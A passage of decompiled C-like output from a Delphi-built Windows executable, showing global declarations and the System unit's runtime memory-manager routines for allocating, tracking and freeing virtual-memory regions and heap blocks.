  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBA8[18] =
{
  &off_405EF4,
  &off_4060D4,
  &off_4060F4,
  &off_40B3E4,
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBB8[14] =
{
  &off_40B45C,
  &off_405FD4,
  &off_406064,
  &off_4060A4,
  &off_406134,
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBCC[9] =
{
  &off_40B3FC,
  &off_405F34,
  &off_405F74,
  &off_4060DC,
  &off_405F84,
  &off_406144,
  &off_405F7C,
  &off_40B41C,
  &off_40611C
}; // weak
int **off_41DBDC[5] = { &off_405F84, &off_406144, &off_405F7C, &off_40B41C, &off_40611C }; // weak
void *off_41DBF0 = &unk_41E014; // weak
int **off_41DBF8 = &off_405FF4; // weak
void *off_41DBFC = &unk_41D700; // weak
int **off_41DC04[5] = { &off_405EFC, &off_405F2C, &off_40601C, &off_4060FC, &off_406124 }; // weak
int **off_41DC0C[3] = { &off_40601C, &off_4060FC, &off_406124 }; // weak
char *off_41DC18 = &byte_41E040; // weak
int **off_41DC24[3] = { &off_40B3F4, &off_406044, &off_40B3CC }; // weak
int **off_41DC28[2] = { &off_406044, &off_40B3CC }; // weak
int **off_41DC2C = &off_40B3CC; // weak
char *off_41DC30 = &byte_41E042; // weak
int **off_41DC38[19] =
{
  &off_40B3D4,
  &off_40608C,
  &off_406034,
  &off_4060AC,
  &off_406184,
  &off_40606C,
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC40[17] =
{
  &off_406034,
  &off_4060AC,
  &off_406184,
  &off_40606C,
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC50[13] =
{
  &off_405F94,
  &off_40B3DC,
  &off_405F1C,
  &off_405FAC,
  &off_405F54,
  &off_405F4C,
  &off_4060B4,
  &off_40B3EC,
  &off_405F64,
  &off_40605C,
  &off_405FB4,
  &off_405F8C,
  &off_405F6C
}; // weak
int **off_41DC78[3] = { &off_405FB4, &off_405F8C, &off_405F6C }; // weak
void *off_41DC84 = &unk_41E5A8; // weak
int **off_41DC88[3] = { &off_405FEC, &off_406084, &off_40B464 }; // weak
int **off_41DC90 = &off_40B464; // weak
int (*dword_41E000)(void); // weak
int dword_41E004; // weak
int (*dword_41E00C)(void); // weak
int (*dword_41E018)(void); // weak
int dword_41E01C; // weak
int dword_41E020; // weak
char byte_41E024; // weak
int dword_41E028; // weak
int dword_41E02C; // weak
int dword_41E030; // weak
_UNKNOWN unk_41E034; // weak
int dword_41E038; // weak
int dword_41E03C; // weak
char byte_41E040; // weak
char byte_41E041; // weak
char byte_41E042; // weak
char byte_41E043; // weak
char byte_41E044; // weak
_DWORD dword_41E048[115]; // idb
_DWORD dword_41E214[115]; // idb
int (__thiscall *dword_41E3E0)(_DWORD); // weak
int (__stdcall *dword_41E3E4)(_DWORD); // weak
int (*dword_41E3E8)(void); // weak
VARIANTARG stru_41E3EC; // idb
VARIANTARG stru_41E3FC; // idb
__int16 word_41E40C; // weak
int dword_41E414; // weak
int dword_41E41C; // weak
int dword_41E420; // weak
int dword_41E424; // weak
char byte_41E428; // weak
int dword_41E42C; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
HLOCAL dword_41E448; // idb
int dword_41E44C; // weak
int dword_41E450; // weak
_DWORD dword_41E460[4]; // idb
_UNKNOWN unk_41E470; // weak
int dword_41E474; // weak
int dword_41E47C; // weak
int dword_41E480; // weak
int dword_41E484; // weak
HLOCAL hMem; // idb
int dword_41E48C[4]; // idb
const void *dword_41E49C; // idb
int dword_41E4A0; // weak
int dword_41E4A4; // weak
int dword_41E4A8; // weak
int dword_41E4AC; // weak
char byte_41E4C8; // weak
char byte_41E4C9; // weak
DWORD TlsIndex; // idb
HMODULE hInst; // idb
int dword_41E4D8; // weak
int dword_41E4DC; // weak
int dword_41E4E0; // weak
int dword_41E4E4; // weak
int dword_41E4E8; // weak
char byte_41E4EC; // weak
char byte_41E4ED; // weak
char byte_41E4EE; // weak
char byte_41E4EF; // weak
char byte_41E4F0; // weak
char byte_41E4F1; // weak
int dword_41E4F4; // weak
int dword_41E4F8; // weak
char byte_41E4FC; // weak
int dword_41E500; // weak
int dword_41E504; // weak
int dword_41E508; // weak
int dword_41E50C[]; // weak
_UNKNOWN unk_41E510; // weak
int dword_41E53C[]; // weak
_UNKNOWN unk_41E540; // weak
int dword_41E56C[]; // weak
_UNKNOWN unk_41E570; // weak
int dword_41E588[]; // weak
_UNKNOWN unk_41E58C; // weak
_UNKNOWN unk_41E5A8; // weak
__int16 word_41E5AC; // weak
__int16 word_41E5AE; // weak
int dword_41E5B0[]; // weak
_UNKNOWN unk_41E5B4; // weak
int dword_41E5CC[]; // weak
_UNKNOWN unk_41E5D0; // weak
char byte_41E5EC; // weak
int dword_41E5F0; // weak
int dword_41E5F4; // weak
int dword_41E5F8; // weak
_DWORD *dword_41E5FC; // idb
int dword_41E600; // weak
int dword_41E604; // weak
int dword_41E608; // weak
int dword_41E60C; // weak
int dword_41E610; // weak
int dword_41E614; // weak
int dword_41E618; // weak
int dword_41E61C; // weak
int dword_41E620; // weak
int dword_41E624; // weak
struct _RTL_CRITICAL_SECTION stru_41E628; // idb
HWND hWnd; // idb
int dword_41E644; // weak
int dword_41E648; // weak
int dword_41E64C; // weak
int dword_41E650; // weak
int dword_41E654; // weak
int dword_41E658; // weak
int dword_41E65C; // weak
int dword_41E660; // weak
int dword_41E664; // weak
int dword_41E668; // weak
int dword_41E66C; // weak
int dword_41E670; // weak
HGDIOBJ ho; // idb
int dword_41E678; // weak
int nNumerator; // idb
HGDIOBJ h; // idb
HGDIOBJ dword_41E684; // idb
HGDIOBJ dword_41E688; // idb
int dword_41E68C; // weak
struct _RTL_CRITICAL_SECTION stru_41E690; // idb
struct _RTL_CRITICAL_SECTION stru_41E6A8; // idb
int dword_41E6C0; // weak
int dword_41E6C4; // weak
int dword_41E6C8; // weak
int dword_41E6CC; // weak
int dword_41E6D0; // weak
int dword_41E6D4; // weak
_UNKNOWN unk_41E6D8; // weak
char byte_41E6D9[2047]; // idb
int dword_41EED8; // weak
int dword_41EEDC; // weak
char *dword_41EEE0; // idb
char *dword_41EEE4; // idb
char *dword_41EEE8; // idb
char *dword_41EEEC; // idb
int dword_41EEF0; // weak
char *dword_41EEF4; // idb
char *dword_41EEF8; // idb
char *a; // idb
char *dword_41EF00; // idb
char *dword_41EF04; // idb
char *dword_41EF08; // idb
int dword_41EF0C; // weak
int dword_41EF10; // weak
int dword_41EF14; // weak
int dword_41EF18; // weak
int dword_41EF1C; // weak
char byte_41EF20; // weak
char byte_41EF21; // weak


//----- (00401214) --------------------------------------------------------
int System::_16453()
{
  int v0; // ebx
  struct _STARTUPINFOA v2; // [esp+0h] [ebp-48h] BYREF

  v0 = 10;
  GetStartupInfoA(&v2);
  if ( (v2.dwFlags & 1) != 0 )
    v0 = v2.wShowWindow;
  return v0;
}

//----- (00401278) --------------------------------------------------------
int System::_16422()
{
  _DWORD *v0; // ecx
  int result; // eax
  int i; // edx

  if ( !dword_41E44C )
  {
    v0 = LocalAlloc(0, 0x644u);
    if ( !v0 )
      return 0;
    *v0 = dword_41E448;
    dword_41E448 = v0;
    for ( i = 0; i != 100; ++i )
    {
      v0[4 * i + 1] = dword_41E44C;
      dword_41E44C = (int)&v0[4 * i + 1];
    }
  }
  result = dword_41E44C;
  dword_41E44C = *(_DWORD *)dword_41E44C;
  return result;
}
// 41E44C: using guessed type int dword_41E44C;

//----- (004012C8) --------------------------------------------------------
_DWORD *__usercall sub_4012C8@<eax>(_DWORD *result@<eax>)
{
  *result = result;
  result[1] = result;
  return result;
}

//----- (004012D0) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall System::_16424@<al>(int *a1@<eax>, int *a2@<edx>)
{
  int *v4; // eax
  int v6; // edx

  v4 = (int *)System::_16422();
  if ( !v4 )
    return 0;
  v4[2] = *a2;
  v4[3] = a2[1];
  v6 = *a1;
  *v4 = *a1;
  v4[1] = (int)a1;
  *(_DWORD *)(v6 + 4) = v4;
  *a1 = (int)v4;
  return 1;
}

//----- (00401300) --------------------------------------------------------
int *__usercall sub_401300@<eax>(int *result@<eax>)
{
  int *v1; // edx
  int v2; // ecx

  v1 = (int *)result[1];
  v2 = *result;
  *v1 = *result;
  *(_DWORD *)(v2 + 4) = v1;
  *result = dword_41E44C;
  dword_41E44C = (int)result;
  return result;
}
// 41E44C: using guessed type int dword_41E44C;

//----- (00401318) --------------------------------------------------------
char __usercall System::_16426@<al>(int *a1@<eax>, int *a2@<edx>, int *a3@<ecx>)
{
  int *v5; // ebx
  int v6; // edi
  char result; // al

  v5 = (int *)*a1;
  *a3 = *a2;
  a3[1] = a2[1];
  do
  {
    v6 = *v5;
    if ( v5[3] + v5[2] == *a3 )
    {
      sub_401300(v5);
      *a3 = v5[2];
      a3[1] += v5[3];
    }
    else if ( v5[2] == a3[1] + *a3 )
    {
      sub_401300(v5);
      a3[1] += v5[3];
    }
    v5 = (int *)v6;
  }
  while ( a1 != (int *)v6 );
  result = System::_16424(a1, a3);
  if ( !result )
  {
    result = 0;
    *a3 = 0;
  }
  return result;
}

//----- (0040138C) --------------------------------------------------------
int *__usercall System::_16427@<eax>(int *a1@<eax>, int **a2@<edx>)
{
  int *v2; // ebx
  int *v4; // esi
  int *result; // eax
  int *v6; // esi
  char *v7; // edi
  int v8[6]; // [esp+0h] [ebp-18h] BYREF

  v2 = a1;
  while ( 1 )
  {
    v4 = *a2;
    result = (int *)v2[2];
    if ( *a2 >= result && (char *)v4 + (int)a2[1] <= (char *)result + v2[3] )
      break;
    v2 = (int *)*v2;
    if ( a1 == v2 )
      return 0;
  }
  if ( v4 == result )
  {
    v2[2] += (int)a2[1];
    result = a2[1];
    v2[3] -= (int)result;
    if ( !v2[3] )
      result = sub_401300(v2);
  }
  else
  {
    v6 = a2[1];
    v7 = (char *)result + v2[3];
    if ( (char *)*a2 + (_DWORD)v6 == v7 )
    {
      v2[3] -= (int)v6;
    }
    else
    {
      v8[0] = (int)*a2 + (_DWORD)a2[1];
      v8[1] = (int)&v7[-v8[0]];
      v2[3] = (char *)*a2 - (char *)result;
      if ( !System::_16424(v2, v8) )
        return 0;
    }
  }
  LOBYTE(result) = 1;
  return result;
}

//----- (0040141C) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall System::_16428@<al>(int a1@<eax>, int *a2@<edx>)
{
  unsigned int v3; // esi
  LPVOID v4; // eax

  if ( a1 >= 0x100000 )
    v3 = (a1 + 0xFFFF) & 0xFFFF0000;
  else
    v3 = 0x100000;
  a2[1] = v3;
  v4 = VirtualAlloc(0, v3, 0x2000u, 1u);
  *a2 = (int)v4;
  if ( v4 )
  {
    LOBYTE(v4) = System::_16424(&dword_41E450, a2);
    if ( !(_BYTE)v4 )
    {
      VirtualFree((LPVOID)*a2, 0, 0x8000u);
      LOBYTE(v4) = 0;
      *a2 = 0;
    }
  }
  return (char)v4;
}
// 41E450: using guessed type int dword_41E450;

//----- (00401480) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall System::_16429@<al>(LPVOID lpAddress@<ecx>, void *a2@<eax>, int a3@<edx>)
{
  LPVOID v6; // eax
  unsigned int v7; // esi

  *((_DWORD *)lpAddress + 1) = 0x100000;
  v6 = VirtualAlloc(a2, 0x100000u, 0x2000u, 4u);
  *(_DWORD *)lpAddress = v6;
  if ( !v6 )
  {
    v7 = (a3 + 0xFFFF) & 0xFFFF0000;
    *((_DWORD *)lpAddress + 1) = v7;
    v6 = VirtualAlloc(a2, v7, 0x2000u, 4u);
    *(_DWORD *)lpAddress = v6;
  }
  if ( *(_DWORD *)lpAddress )
  {
    LOBYTE(v6) = System::_16424(&dword_41E450, (int *)lpAddress);
    if ( !(_BYTE)v6 )
    {
      VirtualFree(*(LPVOID *)lpAddress, 0, 0x8000u);
      LOBYTE(v6) = 0;
      *(_DWORD *)lpAddress = 0;
    }
  }
  return (char)v6;
}
// 41E450: using guessed type int dword_41E450;

//----- (004014F8) --------------------------------------------------------
unsigned int *__usercall System::_16430@<eax>(unsigned int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  int *i; // ebx
  int v5; // edi
  void *v6; // esi
  unsigned int *result; // eax
  unsigned int v9; // [esp+8h] [ebp-1Ch]
  unsigned int v10; // [esp+Ch] [ebp-18h]
  unsigned int v11; // [esp+10h] [ebp-14h]

  v9 = -1;
  v10 = 0;
  v11 = a1 + a2;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)v5 )
  {
    v5 = *i;
    v6 = (void *)i[2];
    if ( a1 <= (unsigned int)v6 && (unsigned int)v6 + i[3] <= v11 )
    {
      if ( (unsigned int)v6 < v9 )
        v9 = i[2];
      if ( (unsigned int)v6 + i[3] > v10 )
        v10 = (unsigned int)v6 + i[3];
      if ( !VirtualFree(v6, 0, 0x8000u) )
        dword_41E42C = 1;
      sub_401300(i);
    }
  }
  result = a3;
  *a3 = 0;
  if ( v10 )
  {
    *a3 = v9;
    result = (unsigned int *)(v10 - v9);
    a3[1] = v10 - v9;
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E450: using guessed type int dword_41E450;

//----- (004015B0) --------------------------------------------------------
LPVOID __usercall System::_16431@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  LPVOID result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v9; // [esp+8h] [ebp-14h]

  v3 = a1 & 0xFFFFF000;
  v9 = (a2 + a1 + 4095) & 0xFFFFF000;
  *a3 = a1 & 0xFFFFF000;
  result = (LPVOID)(v9 - (a1 & 0xFFFFF000));
  a3[1] = (unsigned int)result;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( v3 > (unsigned int)v6 )
      v6 = (char *)v3;
    if ( (unsigned int)v7 > v9 )
      v7 = (char *)v9;
    if ( v7 > v6 )
    {
      result = VirtualAlloc(v6, v7 - v6, 0x1000u, 4u);
      if ( !result )
      {
        result = a3;
        *a3 = 0;
        return result;
      }
    }
  }
  return result;
}
// 41E450: using guessed type int dword_41E450;

//----- (00401644) --------------------------------------------------------
unsigned int __usercall System::_16432@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  unsigned int result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v8; // [esp+0h] [ebp-14h]

  v8 = (a1 + 4095) & 0xFFFFF000;
  v3 = (a2 + a1) & 0xFFFFF000;
  *a3 = v8;
  result = v3 - v8;
  a3[1] = v3 - v8;
  for ( i = (int *)dword_41E450; i != &dword_41E450; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( (unsigned int)v6 < v8 )
      v6 = (char *)v8;
    if ( v3 < (unsigned int)v7 )
      v7 = (char *)v3;
    if ( v7 > v6 )
    {
      result = VirtualFree(v6, v7 - v6, 0x4000u);
      if ( !result )
        dword_41E42C = 2;
    }
  }
  return result;
}
// 41E42C: using guessed type int dword_41E42C;
// 41E450: using guessed type int dword_41E450;

//----- (004016C4) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16433@<eax>(int a1@<eax>, int *a2@<edx>)
{
  int v3; // edi
  int *i; // ebx
  int result; // eax
  int v6[6]; // [esp+0h] [ebp-18h] BYREF

  v3 = (a1 + 0x3FFF) & 0xFFFFC000;
LABEL_2:
  for ( i = (int *)dword_41E460[0]; ; i = (int *)*i )
  {
    if ( i == dword_41E460 )
    {
      LOBYTE(result) = System::_16428(v3, a2);
      if ( !*a2 )
        return result;
      System::_16426(dword_41E460, a2, v6);
      if ( !v6[0] )
      {
        System::_16430(*a2, a2[1], (unsigned int *)v6);
        result = 0;
        *a2 = 0;
        return result;
      }
      goto LABEL_2;
    }
    if ( v3 <= i[3] )
      break;
  }
  result = (int)System::_16431(i[2], v3, (unsigned int *)a2);
  if ( *a2 )
  {
    i[2] += a2[1];
    result = a2[1];
    i[3] -= result;
    if ( !i[3] )
      result = (int)sub_401300(i);
  }
  return result;
}

//----- (00401754) --------------------------------------------------------
int __usercall System::_16434@<eax>(LPVOID lpAddress@<ecx>, void *a2@<eax>, int a3@<edx>)
{
  int v4; // edi
  int *i; // ebx
  int result; // eax
  int v8[2]; // [esp+4h] [ebp-20h] BYREF
  int v9[6]; // [esp+Ch] [ebp-18h] BYREF

  v4 = (a3 + 0x3FFF) & 0xFFFFC000;
  while ( 1 )
  {
    while ( 1 )
    {
      for ( i = (int *)dword_41E460[0]; i != dword_41E460 && a2 != (void *)i[2]; i = (int *)*i )
        ;
      if ( a2 != (void *)i[2] )
        break;
      if ( v4 <= i[3] )
        goto LABEL_14;
      System::_16429(v8, (void *)(i[3] + i[2]), v4 - i[3]);
      if ( !v8[0] )
        break;
      System::_16426(dword_41E460, v8, v9);
      if ( !v9[0] )
        goto LABEL_10;
    }
    System::_16429(v8, a2, v4);
    if ( !v8[0] )
      break;
    System::_16426(dword_41E460, v8, v9);
    if ( !v9[0] )
    {
LABEL_10:
      System::_16430(v8[0], v8[1], (unsigned int *)v9);
      result = (int)lpAddress;
      *(_DWORD *)lpAddress = 0;
      return result;
    }
  }
LABEL_14:
  if ( a2 == (void *)i[2] && v4 <= i[3] )
  {
    System::_16431(i[2], v4, (unsigned int *)lpAddress);
    result = (int)lpAddress;
    if ( *(_DWORD *)lpAddress )
    {
      i[2] += *((_DWORD *)lpAddress + 1);
      result = *((_DWORD *)lpAddress + 1);
      i[3] -= result;
      if ( !i[3] )
        result = (int)sub_401300(i);
    }
  }
  else
  {
    result = (int)lpAddress;
    *(_DWORD *)lpAddress = 0;
  }
  return result;
}

//----- (00401878) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall System::_16435@<al>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v4; // ebx
  unsigned int v5; // esi
  char result; // al
  int *v7; // [esp+4h] [ebp-1Ch] BYREF
  int v8; // [esp+8h] [ebp-18h]
  int *v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]

  v4 = (a1 + 0x3FFF) & 0xFFFFC000;
  v5 = (a1 + a2) & 0xFFFFC000;
  if ( v4 >= v5 )
  {
    result = 0;
    *a3 = 0;
  }
  else
  {
    System::_16432((a1 + 0x3FFF) & 0xFFFFC000, v5 - v4, a3);
    result = System::_16426(dword_41E460, (int *)a3, (int *)&v7);
    if ( v7 )
    {
      System::_16430((unsigned int)v7, v8, (unsigned int *)&v9);
      v7 = v9;
      result = v10;
      v8 = v10;
    }
    if ( v7 )
      result = (unsigned __int8)System::_16427(dword_41E460, &v7);
  }
  return result;
}

//----- (00401904) --------------------------------------------------------
char System::_16436()
{
  int i; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-Ch] BYREF
  int *v3; // [esp-4h] [ebp-4h]
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_4019BA;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  InitializeCriticalSection(&CriticalSection);
  if ( byte_41E041 )
    EnterCriticalSection(&CriticalSection);
  sub_4012C8(&dword_41E450);
  sub_4012C8(dword_41E460);
  sub_4012C8(dword_41E48C);
  hMem = LocalAlloc(0, 0xFF8u);
  if ( hMem )
  {
    for ( i = 3; i != 1025; ++i )
      *((_DWORD *)hMem + i - 3) = 0;
    *((_DWORD *)&unk_41E470 + 1) = &unk_41E470;
    unk_41E470 = &unk_41E470;
    dword_41E47C = (int)&unk_41E470;
    byte_41E428 = 1;
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_4019C1;
  if ( byte_41E041 )
    LeaveCriticalSection(&CriticalSection);
  return byte_41E428;
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;
// 41E450: using guessed type int dword_41E450;
// 41E47C: using guessed type int dword_41E47C;

//----- (004019C8) --------------------------------------------------------
// Borland Visual Component Library & Packages
void System::_16448()
{
  int i; // ebx
  HLOCAL *j; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  if ( byte_41E428 )
  {
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_401A9E;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    if ( byte_41E041 )
      EnterCriticalSection(&CriticalSection);
    byte_41E428 = 0;
    LocalFree(hMem);
    hMem = 0;
    for ( i = dword_41E450; (int *)i != &dword_41E450; i = *(_DWORD *)i )
      VirtualFree(*(LPVOID *)(i + 8), 0, 0x8000u);
    sub_4012C8(&dword_41E450);
    sub_4012C8(dword_41E460);
    sub_4012C8(dword_41E48C);
    for ( j = (HLOCAL *)dword_41E448; dword_41E448; j = (HLOCAL *)dword_41E448 )
    {
      dword_41E448 = *j;
      LocalFree(j);
    }
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_401AA5;
    if ( byte_41E041 )
      LeaveCriticalSection(&CriticalSection);
    DeleteCriticalSection(&CriticalSection);
  }
}
// 41E041: using guessed type char byte_41E041;
// 41E428: using guessed type char byte_41E428;
// 41E450: using guessed type int dword_41E450;

//----- (00401AA8) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall System::_16438@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *v1; // edx
  int v2; // ecx
  int v3; // kr00_4
  _DWORD *result; // eax

  if ( a1 == (_DWORD *)dword_41E47C )
    dword_41E47C = a1[1];
  v1 = (_DWORD *)a1[1];
  v2 = a1[2];
  if ( v2 > 4096 )
  {
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  else if ( a1 == v1 )
  {
    v3 = a1[2];
    result = hMem;
    *((_DWORD *)hMem + v3 / 4 - 3) = 0;
  }
  else
  {
    *((_DWORD *)hMem + a1[2] / 4 - 3) = v1;
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  return result;
}
// 41E47C: using guessed type int dword_41E47C;

//----- (00401B0C) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int *__usercall System::_16439@<eax>(unsigned int a1@<eax>)
{
  int *i; // edx
  unsigned int v2; // ecx

  for ( i = (int *)dword_41E48C[0]; i != dword_41E48C; i = (int *)*i )
  {
    v2 = i[2];
    if ( a1 >= v2 && a1 < i[3] + v2 )
      return i;
  }
  dword_41E42C = 3;
  return 0;
}
// 41E42C: using guessed type int dword_41E42C;

//----- (00401B3C) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
unsigned int *__usercall System::_16440@<eax>(unsigned int *result@<eax>, int a2@<edx>)
{
  unsigned int *v2; // ebx

  v2 = (unsigned int *)((char *)result + a2 - 4);
  if ( a2 < 16 )
  {
    if ( a2 >= 4 )
    {
      *result = a2 | 0x80000002;
      *v2 = a2 | 0x80000002;
    }
  }
  else
  {
    *v2 = -2147483641;
    result = (unsigned int *)System::_16446(result, a2 - 4);
  }
  return result;
}

//----- (00401B6C) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16441@<eax>(int a1@<eax>)
{
  ++dword_41E41C;
  dword_41E420 += (*(_DWORD *)(a1 - 4) & 0x7FFFFFFC) - 4;
  return System::SysFreeMem(a1);
}
// 41E41C: using guessed type int dword_41E41C;
// 41E420: using guessed type int dword_41E420;

//----- (00401B90) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *__usercall System::_16442@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( a2 < 12 )
  {
    if ( a2 >= 4 )
      *a1 = a2 | 0x80000002;
    result = (_DWORD *)((char *)a1 + a2);
    *result &= 0xFFFFFFFE;
  }
  else
  {
    *a1 = a2 | 2;
    result = (_DWORD *)System::_16441((int)(a1 + 1));
  }
  return result;
}

//----- (00401BB8) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16443@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // ebx
  _DWORD *v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v1 = *(_DWORD *)(a1 - 4);
  if ( (v1 & 0x80000002) != -2147483646 )
    dword_41E42C = 4;
  v2 = v1 & 0x7FFFFFFC;
  v3 = (_DWORD *)(a1 - (v1 & 0x7FFFFFFC));
  if ( ((*v3 ^ v1) & 0xFFFFFFFE) != 0 )
    dword_41E42C = 5;
  if ( (*(_BYTE *)v3 & 1) != 0 )
  {
    v4 = *(v3 - 1);
    v5 = (_DWORD *)((char *)v3 - v4);
    if ( v4 != v5[2] )
      dword_41E42C = 6;
    System::_16438(v5);
    v2 += v4;
  }
  return v2;
}
// 41E42C: using guessed type int dword_41E42C;

//----- (00401C28) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall System::_16444@<eax>(int *a1@<eax>)
{
  int *v1; // ebx
  int v2; // edi
  int v3; // eax
  int v4; // eax

  v1 = a1;
  v2 = 0;
  v3 = *a1;
  if ( v3 < 0 )
  {
    v2 = v3 & 0x7FFFFFFC;
    v1 = (int *)((char *)v1 + (v3 & 0x7FFFFFFC));
    v3 = *v1;
  }
  if ( (v3 & 2) == 0 )
  {
    System::_16438(v1);
    v4 = v1[2];
    v2 += v4;
    *(int *)((char *)v1 + v4) &= 0xFFFFFFFE;
  }
  return v2;
}

//----- (00401C60) --------------------------------------------------------
int *__usercall System::_16445@<eax>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int *v4; // ebx
  int v5; // ebp
  int v6; // eax
  int *v7; // ebp
  int *result; // eax
  int *v9; // [esp+0h] [ebp-18h] BYREF
  int v10; // [esp+4h] [ebp-14h]

  v4 = System::_16439((unsigned int)a1);
  v5 = v4[2];
  v6 = v4[3] + v5;
  if ( v6 - ((int)a1 + a2) <= 12 )
    a2 = v6 - (_DWORD)a1;
  if ( (int)a1 - v5 >= 12 )
    System::_16435((int)(a1 + 1), a2 - 4, (unsigned int *)&v9);
  else
    System::_16435(v5, (int)a1 + a2 - v4[2], (unsigned int *)&v9);
  v7 = v9;
  if ( !v9 )
    return 0;
  System::_16440(a1, (char *)v9 - (char *)a1);
  if ( (unsigned int)v7 + v10 < v4[3] + v4[2] )
    System::_16442((int *)((char *)v7 + v10), (char *)a1 + a2 - ((char *)v7 + v10));
  result = System::_16427(v4, &v9);
  LOBYTE(result) = 1;
  return result;
}

//----- (00401CF8) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int *__usercall System::_16446@<eax>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  int *result; // eax
  int v5; // edx
  int v6; // edx

  a1[2] = a2;
  *(unsigned int *)((char *)a1 + a2 - 4) = a2;
  if ( a2 > 4096 )
  {
    if ( a2 < 15360 || (result = System::_16445(a1, a2), !(_BYTE)result) )
    {
      result = (int *)dword_41E47C;
      dword_41E47C = (int)a1;
      v6 = *result;
      a1[1] = (unsigned int)result;
      *a1 = v6;
      *result = (int)a1;
      *(_DWORD *)(v6 + 4) = a1;
    }
  }
  else
  {
    v3 = a2 / 4;
    result = (int *)*((_DWORD *)hMem + v3 - 3);
    if ( result )
    {
      v5 = *result;
      a1[1] = (unsigned int)result;
      *a1 = v5;
      *result = (int)a1;
      *(_DWORD *)(v5 + 4) = a1;
    }
    else
    {
      result = (int *)hMem;
      *((_DWORD *)hMem + v3 - 3) = a1;
      a1[1] = (unsigned int)a1;
      *a1 = (unsigned int)a1;
    }
  }
  return result;
}
// 41E47C: using guessed type int dword_41E47C;

//----- (00401D80) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int System::_16447()
{
  int result; // eax

  if ( dword_41E480 > 0 )
  {
    if ( dword_41E480 >= 12 )
    {
      *(_DWORD *)dword_41E484 = dword_41E480 | 2;
      System::_16441(dword_41E484 + 4);
      dword_41E484 = 0;
      result = 0;
      dword_41E480 = 0;
    }
    else
    {
      dword_41E42C = 7;
